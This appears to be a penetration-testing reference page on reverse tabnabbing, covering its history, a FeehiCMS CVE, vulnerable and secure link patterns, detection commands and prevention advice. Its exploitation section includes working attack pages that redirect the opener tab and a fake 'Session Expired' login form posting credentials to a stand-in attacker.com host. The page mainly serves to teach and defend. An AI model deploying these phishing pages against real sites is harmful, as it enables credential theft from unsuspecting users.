# Tabnabbing

Tabnabbing (also known as reverse tabnabbing) is a computer exploit and phishing attack which persuades users to submit their login details and passwords to popular websites by impersonating those sites and convincing the user that the site is genuine. The attack takes advantage of user trust and inattention to detail in regard to tabs, and the ability of modern web pages to rewrite tabs and their contents a long time after the page is loaded. Tabnabbing operates in reverse of most phishing attacks in that it does not ask users to click on an obfuscated link but instead loads a fake page in one of the open tabs in your browser .

The attack's name was coined in early 2010 by Aza Raskin, a security researcher and design expert .


## How It Works

1. Victim clicks a link that opens in a new tab (`target="_blank"`)
2. The new page has access to `window.opener` (the original page)
3. Attacker's page executes: `window.opener.location = "https://phishing-site.com"`
4. Original tab silently redirects to phishing site
5. Victim returns to original tab, sees fake login, enters credentials

The exploit employs scripts on a page of average interest, which rewrite the page with an impersonation of a well-known website, after the page has been left unattended for some time. A user who returns after a while and sees the rewritten page may be induced to believe the page is legitimate and enter their login, password and other details that will be used for improper purposes. The attack can be made more likely to succeed if the script checks for well known Web sites the user has loaded in the past or in other tabs, and loads a simulation of the same sites. This attack can be done even if JavaScript is disabled, using the "meta refresh" meta element, an HTML attribute used for page redirection that causes a reload of a specified new page after a given time interval .

Reverse tabnabbing is an attack where a page linked from the target page is able to rewrite that page, for example to replace it with a phishing site. As the user was originally on the correct page they are less likely to notice that it has been changed to a phishing site, especially if the site looks the same as the target. If the user authenticates to this new page then their credentials (or other sensitive data) are sent to the phishing site rather than the legitimate one .

As well as the target site being able to overwrite the target page, any http link can be spoofed to overwrite the target page if the user is on an unsecured network, for example a public wifi hotspot. The attack is possible even if the target site is only available via https as the attacker only needs to spoof the http site that is being linked to .


## Real-World Example and History

### Aza Raskin's Original Description (2010)

When Aza Raskin coined the term, he provided a striking example of how the attack could be executed:

"It can detect that you're logged into Citibank right now and Citibank has been training you to log into your account every 15 minutes because it logs you out for better security. It's like being hit by the wrong end of the sword," said Aza Raskin .

The scenario demonstrates how attackers could time their phishing pages to match user expectations created by legitimate websites' security practices.

### CVE-2025-63522: FeehiCMS Vulnerability (Discovered 2025)

A real-world, documented vulnerability affecting production software was discovered in 2025. CVE-2025-63522 identifies a Reverse Tabnabbing vulnerability in FeehiCMS version 2.1.1, located within the Comments Management function .

**Technical Details of the Vulnerability:**
- **Affected Software**: FeehiCMS 2.1.1
- **Attack Vector**: Comments Management function
- **Required Privileges**: Low (attacker must be able to post comments)
- **User Interaction**: Required (victim must click the malicious link)
- **CVSS v3 Score**: 4.6 (Medium severity)
- **CVSS v2 Score**: 5.5 (Medium severity)
- **CWE Category**: CWE-1021 (Improper Neutralization of Input During Web Page Generation)

**Impact Assessment:**
For organizations using FeehiCMS 2.1.1, this vulnerability poses a risk primarily to confidentiality and integrity. Attackers could leverage the vulnerability to conduct phishing attacks, steal user credentials, or redirect users to malicious sites, potentially compromising user accounts or internal systems. The requirement for some privileges to post comments limits the attacker's initial access, but insider threats or compromised accounts could facilitate exploitation .

**Affected Countries:** Germany, France, United Kingdom, Netherlands, Italy, Spain, Poland 

**Mitigation for this specific CVE:**
1. Immediately review and restrict privileges related to comment posting to trusted users only
2. Sanitize and validate all user-generated content rigorously to prevent injection of malicious links or scripts
3. Modify the CMS or web server configuration to add `rel="noopener noreferrer"` attributes to all external links opened with `target="_blank"`
4. Monitor comment sections for suspicious links or behavior
5. Engage with the FeehiCMS vendor or community to obtain patches or updates as soon as they become available
6. Consider implementing Content Security Policy (CSP) headers to restrict navigation and framing behaviors 

### Why Tabnabbing Has Not Seen Large-Scale Adoption

Despite its clever design, tabnabbing has struggled to gain popularity with cybercriminals. In 2010, Brian Krebs discussed the attack in detail and explained how many advantages it has over traditional tools. Since then, security researchers have published proof-of-concept pages showing how tabnabbing might work in the wild, including more polished designs that overcame technical difficulties. However, these were all published with the idea of protecting and educating users, not harming them .

We have yet to see any large-scale tabnabbing attacks against unsuspecting internet users. Several factors explain this:

1. **Technical Complexity**: Tabnabbing involves compromising a website and injecting code into it, making it more technically challenging than traditional phishing 
2. **Established Alternatives**: Cybercriminals remain satisfied with the results of tried and tested methods (traditional phishing, credential harvesting via email) and reckon that additional innovation is not worth the effort 
3. **Browser Mitigations**: Modern browsers have implemented implicit protections (discussed below)

Nevertheless, the attack vector remains valid and the recent CVE-2025-63522 demonstrates that production software continues to be vulnerable, meaning the threat persists and should not be underestimated.


## Vulnerable Code Pattern

```html
<!-- VULNERABLE: No rel attribute -->
<a href="https://attacker.com" target="_blank">Click me</a>

<!-- VULNERABLE: Empty rel attribute -->
<a href="https://attacker.com" target="_blank" rel="">Click me</a>

<!-- VULNERABLE: Only noreferrer (still allows opener access in some browsers) -->
<a href="https://attacker.com" target="_blank" rel="noreferrer">Click me</a>
```

The attack is typically possible when the source site uses a `target` instruction in an HTML link to specify a target loading location that does not replace the current location and then let the current window/tab available and does not include any of the preventative measures detailed below. The attack is also possible for links opened via the `window.open` javascript function .


## Secure Code Pattern

```html
<!-- SECURE: noopener prevents window.opener access -->
<a href="https://external.com" target="_blank" rel="noopener">Click me</a>

<!-- SECURE: Both noopener and noreferrer -->
<a href="https://external.com" target="_blank" rel="noopener noreferrer">Click me</a>

<!-- SECURE: Modern browsers auto-add noopener, but explicit is better -->
```


## Detection

### Manual Testing

```bash
# Find vulnerable links
grep -rn 'target="_blank"' . | grep -v 'noopener'
grep -rn 'target=\\"_blank\\"' . | grep -v 'noopener'

# Check in browser DevTools
# Elements tab → search: target="_blank"
# Verify each has rel="noopener"
```

### Automated Scanning

```bash
# Using nuclei
nuclei -t http/vulnerabilities/generic/tabnabbing-check.yaml -u https://target.com

# Using custom grep on crawled pages
katana -u https://target.com -d 3 | while read url; do
  curl -s "$url" | grep -oP '<a[^>]*target="_blank"[^>]*>' | grep -v 'noopener'
done
```

### Burp Suite Extension

A Burp Suite Professional extension in Java is available for Tabnabbing attack detection (AdrianCitu/burp-tabnabbing-extension) .

### Advanced Detection Research

Recent research (2024) has explored using Reinforcement Learning (RL) to detect Tabnabbing attacks at the web browser level. A study presented at an IEEE conference in December 2023 evaluated the effectiveness of RL in detecting Tabnabbing attacks, using a Deep Q-Network (DQN) algorithm to handle high-dimensional state spaces. The research extracted critical features of Tabnabbing attacks from a publicly available dataset called "Phishpedia". While the RL agent demonstrated promising results, researchers noted there is room for improvement requiring further research and model tuning .


## Exploitation

### Basic Attack Page

```html
<!-- attacker.com/evil.html -->
<!DOCTYPE html>
<html>
<head><title>Interesting Article</title></head>
<body>
<h1>Loading content...</h1>
<script>
if (window.opener) {
    // Redirect parent to phishing page
    window.opener.location = "https://attacker.com/phishing.html";
}
</script>
</body>
</html>
```

### Phishing Page

```html
<!-- attacker.com/phishing.html (looks like target) -->
<!DOCTYPE html>
<html>
<head><title>Target.com - Session Expired</title></head>
<body>
<h1>Your session has expired</h1>
<form action="https://attacker.com/capture" method="POST">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <button type="submit">Login</button>
</form>
</body>
</html>
```

### Delayed Attack (More Stealthy)

```javascript
// Wait before redirecting (victim less likely to notice)
setTimeout(function() {
    if (window.opener) {
        window.opener.location = "https://attacker.com/phishing.html";
    }
}, 5000); // 5 seconds delay
```

### Malicious Site Template (from OWASP)

Vulnerable page that opens a malicious link:

```html
<html>
 <body>
  <li><a href="bad.example.com" target="_blank">Vulnerable target using html link to open the new page</a></li>
  <button onclick="window.open('https://bad.example.com')">Vulnerable target using javascript to open the new page</button>
 </body>
</html>
```

Malicious Site that is linked to:

```html
<html>
 <body>
  <script>
   if (window.opener) {
      window.opener.location = "https://phish.example.com";
   }
  </script>
 </body>
</html>
```

When a user clicks on the Vulnerable Target link/button then the Malicious Site is opened in a new tab (as expected) but the target site in the original tab is replaced by the phishing site .


## Accessible Properties from Malicious Site

The malicious site can only access the following properties from the `opener` javascript object reference (that is in fact a reference to a `window` javascript class instance) in case of **cross origin** (cross domains) access :

| Property | Description |
|----------|-------------|
| `opener.closed` | Returns a boolean value indicating whether a window has been closed or not |
| `opener.frames` | Returns all iframe elements in the current window |
| `opener.length` | Returns the number of iframe elements in the current window |
| `opener.opener` | Returns a reference to the window that created the window |
| `opener.parent` | Returns the parent window of the current window |
| `opener.self` | Returns the current window |
| `opener.top` | Returns the topmost browser window |

If the domains are the same, then the malicious site can access all the properties exposed by the `window` javascript object reference .


## Attack Scenarios

| Scenario | Description |
|----------|-------------|
| Forum posts | User-submitted links with target="_blank" |
| Comments | Blog/article comment sections |
| User profiles | Profile links to external sites |
| Documentation | Links to external resources |
| Email links | Webmail rendering links |
| Social Media Platforms | A user visits a social media platform such as Facebook, where they feel safe and less cautious. While browsing other tabs, they click on an enticing link or advertisement that seems legitimate. The original social media tab becomes inactive, allowing hackers time to replicate it and set up a redirect. Upon returning to the original tab, the user sees what appears to be their Facebook page, but it is a malicious copy. The user is prompted to re-enter login information, unknowingly giving attackers access to their account  |
| Ads and Pop-ups | Tabnabbing attacks often rely on multiple open tabs and can also be triggered by adverts or pop-ups  |


## Browser Behavior

| Browser | Default Behavior (2024+) |
|---------|--------------------------|
| Chrome 88+ | Implicitly adds `noopener` |
| Firefox 79+ | Implicitly adds `noopener` |
| Safari 12.1+ | Implicitly adds `noopener` |
| Edge 88+ | Implicitly adds `noopener` |

> **Note:** While modern browsers add implicit protection, explicit `rel="noopener"` is still recommended for older browser support and code clarity.


## window.open() Vulnerability

```javascript
// VULNERABLE
window.open('https://attacker.com');

// SECURE
window.open('https://external.com', '_blank', 'noopener,noreferrer');
```


## Prevention Best Practices

### For Developers

1. Always add `rel="noopener noreferrer"` to links with `target="_blank"`
2. Use `rel="noopener"` even when modern browsers add it implicitly (defense in depth)
3. For `window.open()`, specify `noopener,noreferrer` in the window features parameter
4. Implement Content Security Policy (CSP) headers to restrict navigation behaviors
5. Sanitize and validate all user-generated content, especially links in comments and forum posts

### For Users

1. Keep only a few tabs open to reduce the risk of losing track of inactive pages that attackers can exploit 
2. Always check the address bar before entering sensitive information; malicious replicas often have slightly altered addresses 
3. Inspect page content carefully for minor design differences, spelling errors, or unusual wording 
4. Use two-factor authentication (2FA) so that even if credentials are compromised, the additional layer provides protection 
5. Keep browsers and extensions updated, as security patches reduce vulnerabilities 
6. Establish the habit of double-checking the address bar of your browser before entering your username and password 
7. Use extensions like NoScript which defends both from JavaScript-based and scriptless attacks (based on meta refresh) by preventing inactive tabs from changing the location of the page 


## Defense Tools

| Tool | Description | Language |
|------|-------------|----------|
| blankshield | Prevents reverse tabnabbing phishing attacks caused by _blank | JavaScript  |
| Burp Tabnabbing Extension | Burp Suite Professional extension for Tabnabbing attack detection | Java  |
| Bliss Browser TabNab | Browser-level tab nabbing prevention system | Python  |
| NoScript | Firefox extension that prevents inactive tabs from changing page location | Extension  |


## Related Topics

- [XSS](https://www.pentest-book.com/enumeration/web/xss) - Can be used to inject malicious links
- [Phishing](https://www.pentest-book.com/others/social-engineering) - Tabnabbing enables phishing
- [CSRF](https://www.pentest-book.com/enumeration/web/csrf) - Related browser security issues
